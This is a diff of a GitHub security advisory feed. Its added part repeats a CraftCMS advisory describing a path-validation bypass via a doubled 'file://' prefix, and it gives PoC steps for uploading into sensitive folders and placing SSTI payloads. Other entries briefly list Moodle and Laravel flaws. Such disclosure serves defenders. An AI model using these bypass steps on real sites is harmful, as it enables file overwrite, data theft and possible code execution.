+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/2.png"></li>
+<li>Access Assets from the left navigation bar, then upload a file into this volume.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/3.png"></li>
+<li>The file is successfully uploaded and stored in the sensitive folder specified (e.g., <code>/vendor</code>).
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/4.png"></li>
+<li>SSTI payloads can be uploaded to <code>/templates</code> folder, though full code execution was not achieved during testing, some payloads were still successful, leading to sensitive information disclosure, among other potential impacts.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/7306f23f208e8e8dff48d65a0dc02dc.png"></li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Attackers who compromise an admin account(The admin user is not equal to the server owner) can exploit this flaw to assign sensitive folders as the base path of the filesystem. For instance, if the path <code>/templates</code> is specified (e.g., <code>file://file:////var/www/html/templates</code>), the attacker could upload SSTI payloads. While CraftCMS includes strict SSTI input sanitization, RCE may still be possible if the attacker can craft a valid payload, as seen in similar vulnerabilities (e.g., <a href="https://github.com/advisories/GHSA-44wr-rmwq-3phw">GHSA-44wr-rmwq-3phw</a>).</p>
+<p>Additionally, attackers can upload tampered files to overwrite critical web application files. By enabling public URLs for files in the specified filesystem, they can also retrieve sensitive files (e.g., configuration files from the local file system).</p>
+<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
+<li><a href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-13T14:12:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Local File System Validation Bypass Leading to File Overwrite, Sensitive File Access, and Potential Code Execution]]></title>
+        <id>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</id>
+        <link href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q"/>
+        <updated>2024-11-13T14:12:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A vulnerability in CraftCMS allows an attacker to bypass local file system validation by utilizing a double <code>file://</code> scheme (e.g., <code>file://file:////</code>). This enables the attacker to specify sensitive folders as the file system, leading to potential file overwriting through malicious uploads, unauthorized access to sensitive files, and, under certain conditions, remote code execution (RCE) via Server-Side Template Injection (SSTI) payloads.</p>
+<p>Note that this will only work if you have an authenticated administrator account with <a href="https://craftcms.com/docs/5.x/reference/config/general.html#allowadminchanges">allowAdminChanges enabled</a>.</p>
+<p><a href="https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production">https://craftcms.com/knowledge-base/securing-craft#set-allowAdminChanges-to-false-in-production</a></p>
+<h3 id="details">Details</h3>
+<p>The issue lies in line 57 of <code>cms/src/helpers/FileHelper.php</code>, it only removes <code>file://</code> on the most left. It is trivial to bypass this sanitization by adding 2 <code>file://</code>, e.g. <code>file://file:////</code>.</p>
+<pre><code class="language-php">    public static function normalizePath($path, $ds = DIRECTORY_SEPARATOR): string
+    {
+        // Remove any file protocol wrappers
+        $path = StringHelper::removeLeft($path, 'file://');
+
+        // Is this a UNC network share path?
+        $isUnc = (str_starts_with($path, '//') || str_starts_with($path, '\\\\'));
+
+        // Normalize the path
+        $path = parent::normalizePath($path, $ds);
+
+        // If it is UNC, add those slashes back in front
+        if ($isUnc) {
+            $path = $ds . $ds . ltrim($path, $ds);
+        }
+
+        return $path;
+    }
+</code></pre>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Sign in with an admin account and navigate to <code>Settings → Assets</code>, then create a new volume.</li>
+<li>n the Asset Filesystem section, create a new file system and set the Base Path to <code>file://file:////vendor</code>.
+Without the prefix, the selection fails.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/1.png">
+With the double <code>file://</code> prefix, the selection succeeds.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/2.png"></li>
+<li>Access Assets from the left navigation bar, then upload a file into this volume.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/3.png"></li>
+<li>The file is successfully uploaded and stored in the sensitive folder specified (e.g., <code>/vendor</code>).
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/4.png"></li>
+<li>SSTI payloads can be uploaded to <code>/templates</code> folder, though full code execution was not achieved during testing, some payloads were still successful, leading to sensitive information disclosure, among other potential impacts.
+ <img alt="alt text" src="https://winslow1984.com/uploads/images/gallery/2024-09/7306f23f208e8e8dff48d65a0dc02dc.png"></li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>Attackers who compromise an admin account(The admin user is not equal to the server owner) can exploit this flaw to assign sensitive folders as the base path of the filesystem. For instance, if the path <code>/templates</code> is specified (e.g., <code>file://file:////var/www/html/templates</code>), the attacker could upload SSTI payloads. While CraftCMS includes strict SSTI input sanitization, RCE may still be possible if the attacker can craft a valid payload, as seen in similar vulnerabilities (e.g., <a href="https://github.com/advisories/GHSA-44wr-rmwq-3phw">GHSA-44wr-rmwq-3phw</a>).</p>
+<p>Additionally, attackers can upload tampered files to overwrite critical web application files. By enabling public URLs for files in the specified filesystem, they can also retrieve sensitive files (e.g., configuration files from the local file system).</p>
+<p>Although the vulnerability is exploitable only in the authenticated users, configuration with <code>ALLOW_ADMIN_CHANGES=true</code>, there is still a potential security threat.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/craftcms/cms/security/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
+<li><a href="https://github.com/advisories/GHSA-jrh5-vhr9-qh7q">https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jrh5-vhr9-qh7q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-13T14:12:36.000Z</published>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[[laravel/framework] Laravel environment manipulation via query string]]></title>
         <id>https://github.com/advisories/GHSA-gv7v-rgg6-548h</id>
         <link href="https://github.com/advisories/GHSA-gv7v-rgg6-548h"/>
@@ -335,144 +945,6 @@
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
             <uri>https://github.com/advisories/GHSA-4gq2-x5w4-7hp8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-11T15:31:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[moodle/moodle] Moodle's user/power level management inconsistent with suspended users]]></title>
-        <id>https://github.com/advisories/GHSA-q99x-mjmh-v8w7</id>
-        <link href="https://github.com/advisories/GHSA-q99x-mjmh-v8w7"/>
-        <updated>2024-11-12T21:26:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in moodle. Matrix room membership and power levels are incorrectly applied and revoked for suspended Moodle users.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43433">https://nvd.nist.gov/vuln/detail/CVE-2024-43433</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2304261">https://bugzilla.redhat.com/show_bug.cgi?id=2304261</a></li>
-<li><a href="https://moodle.org/mod/forum/discuss.php?d=461202">https://moodle.org/mod/forum/discuss.php?d=461202</a></li>
-<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-81951">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-81951</a></li>
-<li><a href="https://github.com/advisories/GHSA-q99x-mjmh-v8w7">https://github.com/advisories/GHSA-q99x-mjmh-v8w7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q99x-mjmh-v8w7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-11T15:31:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[moodle/moodle] Moodle's user/power level management inconsistent with suspended users]]></title>
-        <id>https://github.com/advisories/GHSA-q99x-mjmh-v8w7</id>
-        <link href="https://github.com/advisories/GHSA-q99x-mjmh-v8w7"/>
-        <updated>2024-11-12T21:26:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in moodle. Matrix room membership and power levels are incorrectly applied and revoked for suspended Moodle users.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43433">https://nvd.nist.gov/vuln/detail/CVE-2024-43433</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2304261">https://bugzilla.redhat.com/show_bug.cgi?id=2304261</a></li>
-<li><a href="https://moodle.org/mod/forum/discuss.php?d=461202">https://moodle.org/mod/forum/discuss.php?d=461202</a></li>
-<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-81951">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-81951</a></li>
-<li><a href="https://github.com/advisories/GHSA-q99x-mjmh-v8w7">https://github.com/advisories/GHSA-q99x-mjmh-v8w7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q99x-mjmh-v8w7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-11T15:31:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[moodle/moodle] Moodle authorization headers preserved between "emulated redirects"]]></title>
-        <id>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</id>
-        <link href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8"/>
-        <updated>2024-11-12T21:25:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in moodle. The cURL wrapper in Moodle strips HTTPAUTH and USERPWD headers during emulated redirects, but retains other original request headers, so HTTP authorization header information could be unintentionally sent in requests to redirect URLs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43432">https://nvd.nist.gov/vuln/detail/CVE-2024-43432</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2304260">https://bugzilla.redhat.com/show_bug.cgi?id=2304260</a></li>
-<li><a href="https://moodle.org/mod/forum/discuss.php?d=461200">https://moodle.org/mod/forum/discuss.php?d=461200</a></li>
-<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136</a></li>
-<li><a href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8">https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-11T15:31:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[moodle/moodle] Moodle authorization headers preserved between "emulated redirects"]]></title>
-        <id>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</id>
-        <link href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8"/>
-        <updated>2024-11-12T21:25:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in moodle. The cURL wrapper in Moodle strips HTTPAUTH and USERPWD headers during emulated redirects, but retains other original request headers, so HTTP authorization header information could be unintentionally sent in requests to redirect URLs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43432">https://nvd.nist.gov/vuln/detail/CVE-2024-43432</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2304260">https://bugzilla.redhat.com/show_bug.cgi?id=2304260</a></li>
-<li><a href="https://moodle.org/mod/forum/discuss.php?d=461200">https://moodle.org/mod/forum/discuss.php?d=461200</a></li>
-<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136</a></li>
-<li><a href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8">https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-11T15:31:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[moodle/moodle] Moodle authorization headers preserved between "emulated redirects"]]></title>
-        <id>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</id>
-        <link href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8"/>
-        <updated>2024-11-12T21:25:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in moodle. The cURL wrapper in Moodle strips HTTPAUTH and USERPWD headers during emulated redirects, but retains other original request headers, so HTTP authorization header information could be unintentionally sent in requests to redirect URLs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43432">https://nvd.nist.gov/vuln/detail/CVE-2024-43432</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2304260">https://bugzilla.redhat.com/show_bug.cgi?id=2304260</a></li>
-<li><a href="https://moodle.org/mod/forum/discuss.php?d=461200">https://moodle.org/mod/forum/discuss.php?d=461200</a></li>
-<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136</a></li>
-<li><a href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8">https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-11T15:31:00.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[moodle/moodle] Moodle authorization headers preserved between "emulated redirects"]]></title>
-        <id>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</id>
-        <link href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8"/>
-        <updated>2024-11-12T21:25:48.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in moodle. The cURL wrapper in Moodle strips HTTPAUTH and USERPWD headers during emulated redirects, but retains other original request headers, so HTTP authorization header information could be unintentionally sent in requests to redirect URLs.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43432">https://nvd.nist.gov/vuln/detail/CVE-2024-43432</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2304260">https://bugzilla.redhat.com/show_bug.cgi?id=2304260</a></li>
-<li><a href="https://moodle.org/mod/forum/discuss.php?d=461200">https://moodle.org/mod/forum/discuss.php?d=461200</a></li>
-<li><a href="http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136">http://git.moodle.org/gw?p=moodle.git&amp;a=search&amp;h=HEAD&amp;st=commit&amp;s=MDL-82136</a></li>
-<li><a href="https://github.com/advisories/GHSA-7wmp-2xmx-g6h8">https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7wmp-2xmx-g6h8</uri>
         </author>
         <category label="severity" term="LOW"/>
         <published>2024-11-11T15:31:00.000Z</published>
